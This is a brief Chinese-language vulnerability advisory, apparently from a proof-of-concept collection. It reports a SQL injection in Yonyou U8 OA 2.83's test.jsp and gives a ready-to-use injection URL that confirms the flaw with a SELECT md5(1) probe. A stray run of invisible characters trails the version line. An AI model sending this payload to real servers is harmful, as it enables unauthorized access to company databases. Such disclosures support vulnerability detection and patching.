### 漏洞描述：

用友U8 OA test.jsp的参数存在SQL注入漏洞。

### 影响版本：

用友网络科技股份有限公司 用友U8-OA企业版 2.83‌‌‌‏‍‎‌‏‌‏‌‎‎‌‏‎‏‌‌‎‌‏‌‏‏‌‌‏‍‎‏‏‌‏‌‍​‎‌‏‎‏‎‍‍‏‎‎‏

### Payload：

```jsx
/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))
```

---
